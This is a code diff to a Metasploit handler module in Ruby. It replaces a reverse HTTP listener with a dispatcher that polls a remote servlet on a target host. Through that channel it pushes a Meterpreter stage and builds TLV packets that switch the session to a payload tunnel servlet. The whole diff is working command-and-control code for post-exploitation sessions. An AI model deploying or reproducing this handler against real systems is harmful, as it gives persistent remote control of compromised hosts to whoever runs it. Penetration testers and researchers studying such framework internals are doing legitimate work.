@@ -4,6 +4,77 @@ require 'rex/sync/ref'
 module Msf
 module Handler
 
+# pseudo Rex::Proto:Http:ServerClient that can only send_response back to our dispatcher thread
+class WarBindHttpCli
+	def initialize(disp)
+		@disp = disp
+	end
+	
+	def send_response(resp)
+		@disp.blob = resp.body
+	end
+end
+
+# passive_dispatcher to be used by Rex::Post::Meterpreter::PacketDispatcher
+class WarBindHttpDispatcher
+	def initialize(framework, host, port, url, init_blob)
+		@framework = framework
+		@shutdown = false
+		self.blob = init_blob
+		@host = host
+		@port = port
+		@url = url
+		@state = 0
+		@session_id = [0].pack('N')
+	end
+	
+	def remove_resource(name)
+		if @state == 0
+			@state = 1
+		elsif @state == 2
+			@shutdown = true
+		else
+			raise RuntimeError, "Unexpected remove_resource in state #{@state}"
+		end
+	end
+	
+	def add_resource(name, opts)
+		if @state == 1
+			@state = 2
+			@proc = opts["Proc"]
+			@poll_thread = @framework.threads.spawn("WarBindHttpPollThread-#{@host}:#{@port}/#{@url}", false) {
+				while ! @shutdown
+					c = Rex::Proto::Http::Client.new(@host, @port)
+					r = c.request_cgi({
+						'uri'          => @url,
+						'method'       => 'POST',
+						'ctype'        => 'application/octet-stream',
+						'data'         => @session_id + self.blob,
+					})
+					res = c.send_recv(r,20)
+					c.close()
+					if (! res or res.code < 200 or res.code >= 300)
+						raise RuntimeError, "Upload failed"
+					end
+					req = Rex::Proto::Http::Request.new()
+					@session_id = res.body[0..3]
+					req.body = res.body[4..-1]
+					cli = WarBindHttpCli.new(self)
+					self.blob = ""
+					@proc.call(cli,req)
+				end
+			}
+		else
+			raise RuntimeError, "Unexpected add_resource in state #{@state}"
+		end
+	end
+	
+	def close_client(cli)
+	end
+	
+	attr_accessor :blob
+end
+
 ###
 #
 # This handler implements the HTTP tunneling interface to a servlet.
@@ -34,180 +105,49 @@ module WarBindHttp
 	#
 	def initialize(info = {})
 		super
+
 		register_options(
 			[
-				OptString.new('SERVLETURI', [ true,  "The URI of the servlet to connect to.", ''])
-			], Msf::Handler::ReverseTcp)
+				Opt::RHOST,
+				Opt::RPORT(80),
+				OptString.new('SERVLETURI', [ true,  "The URI of the servlet to connect to.", '/test/'])
+			], Msf::Handler::WarBindHttp)
 
 		register_advanced_options(
 			[
 				OptInt.new('SessionExpirationTimeout', [ false, 'The number of seconds before this session should be forcible shut down', (24*3600*7)]),
 				OptInt.new('SessionCommunicationTimeout', [ false, 'The number of seconds of no activity before this session should be killed', 300])
-			], Msf::Handler::ReverseHttps)
-	end
-
-	#
-	# Toggle for IPv4 vs IPv6 mode
-	#
-	def ipv6
-		self.refname.index('ipv6') ? true : false
+			], Msf::Handler::WarBindHttp)
 	end
 	
 	#
-	# Create a HTTP listener
-	#
-	def setup_handler
-
-		comm = datastore['ReverseListenerComm']
-		if (comm.to_s == "local")
-			comm = ::Rex::Socket::Comm::Local
-		else
-			comm = nil
-		end
-
-		# Start the HTTPS server service on this host/port
-		self.service = Rex::ServiceManager.start(Rex::Proto::Http::Server,
-			4114,
-			ipv6 ? '::' : '0.0.0.0',
-			false,
-			{
-				'Msf'        => framework,
-				'MsfExploit' => self,
-			},
-			comm
-		)
-
-		# Create a reference to ourselves
-		obj = self
-
-		# Add the new resource
-		service.add_resource("/",
-			'Proc' => Proc.new { |cli, req|
-				on_request(cli, req, obj)
-			},
-			'VirtualDirectory' => true)
-
-		self.conn_ids = []
-		print_status("Started HTTP reverse handler on http://localhost:4114/")
-	end
-
-	#
-	# Simply calls stop handler to ensure that things are cool.
-	#
-	def cleanup_handler
-		stop_handler
-	end
-
-	#
-	# Basically does nothing.  The service is already started and listening
-	# during set up.
+	# Start monitoring for a connection.
 	#
 	def start_handler
-	end
+		classname = "metasploit.PayloadTunnelServlet\x00"
+		blob = ""
+		blob << self.generate_stage
 
-	#
-	# Removes the / handler, possibly stopping the service if no sessions are
-	# active on sub-urls.
-	#
-	def stop_handler
-		self.service.remove_resource("/") if self.service
-	end
-
-	attr_accessor :service # :nodoc:
-	attr_accessor :conn_ids
-
-protected
-
-	#
-	# Parses the HTTPS request
-	#
-	def on_request(cli, req, obj)
-		sid  = nil
-		resp = Rex::Proto::Http::Response.new
-
-		print_status("#{cli.peerhost}:#{cli.peerport} Request received for #{req.relative_resource}...")
-
-		lhost = "localhost"
-
-		# Default to our own IP if the user specified 0.0.0.0 (pebkac avoidance)
-		if lhost.empty? or lhost == '0.0.0.0'
-			lhost = Rex::Socket.source_address(cli.peerhost)
-		end
+		# This is a TLV packet - I guess somewhere there should be API for building them
+		# in Metasploit :-)
+		packet = ""
+		packet << ["core_switch_call\x00".length + 8, 0x10001].pack('NN') + "core_switch_call\x00"
+		packet << [classname.length+8, 0x1000a].pack('NN')+classname
+		packet << [12, 0x2000b, datastore['SessionExpirationTimeout'].to_i].pack('NNN')
+		packet << [12, 0x20019, datastore['SessionCommunicationTimeout'].to_i].pack('NNN')
+		blob << [packet.length+8, 0].pack('NN') + packet
 		
-		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-		
-		uri_match = req.relative_resource
-		
-		# Process the requested resource.
-		case uri_match
-			when /^\/INITJM/
-				print_line("Java: #{req.relative_resource}")
+		disp = WarBindHttpDispatcher.new(framework, datastore['RHOST'], datastore['RPORT'], datastore['SERVLETURI'], blob)
 
-				conn_id = "CONN_" + Rex::Text.rand_text_alphanumeric(16)
-				url = "metasploit.PayloadTunnelServlet\x00"
-				real_url = "http://localhost:4114/" + conn_id + "/\x00"
-
-				print_line "Conn ID: #{conn_id}"
-
-				blob = [conn_id.length].pack('n') + conn_id
-				blob << obj.generate_stage
-
-				# This is a TLV packet - I guess somewhere there should be API for building them
-				# in Metasploit :-)
-				packet = ""
-				packet << ["core_switch_call\x00".length + 8, 0x10001].pack('NN') + "core_switch_call\x00"
-				packet << [url.length+8, 0x1000a].pack('NN')+url
-				packet << [12, 0x2000b, datastore['SessionExpirationTimeout'].to_i].pack('NNN')
-				packet << [12, 0x20019, datastore['SessionCommunicationTimeout'].to_i].pack('NNN')
-				blob << [packet.length+8, 0].pack('NN') + packet
-
-				resp.body = blob
-				conn_ids << conn_id
-
-				# Short-circuit the payload's handle_connection processing for create_session
-				create_session(cli, {
-					:passive_dispatcher => obj.service,
-					:conn_id            => conn_id,
-					:url                => real_url,
-					:expiration         => datastore['SessionExpirationTimeout'].to_i,
-					:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
-					:ssl                => false
-				})
-
-			when /^\/(CONN_.*)\//
-				resp.body = ""
-				conn_id = $1
-				print_line("Received poll from #{conn_id}")
-
-				if not self.conn_ids.include?(conn_id)
-					print_status("Incoming orphaned session #{conn_id}, reattaching...")
-					conn_ids << conn_id
-
-					# Short-circuit the payload's handle_connection processing for create_session
-					create_session(cli, {
-						:passive_dispatcher => obj.service,
-						:conn_id            => conn_id,
-						:url                => url,
-						:expiration         => datastore['SessionExpirationTimeout'].to_i,
-						:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
-						:ssl                => false
-					})
-				end
-			else
-				print_status("#{cli.peerhost}:#{cli.peerport} Unknown request to #{uri_match} #{req.inspect}...")
-				resp.code    = 200
-				resp.message = "OK"
-				resp.body    = "<h3>No site configured at this address</h3>"
-		end
-
-		cli.send_response(resp) if (resp)
-
-		# Force this socket to be closed
-		obj.service.close_client( cli )
+		# Short-circuit the payload's handle_connection processing for create_session
+		create_session(nil, {
+			:passive_dispatcher => disp,
+			:conn_id            => '',
+			:expiration         => datastore['SessionExpirationTimeout'].to_i,
+			:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
+			:ssl                => false
+		})
 	end
-
-
 end
-
 end
 end
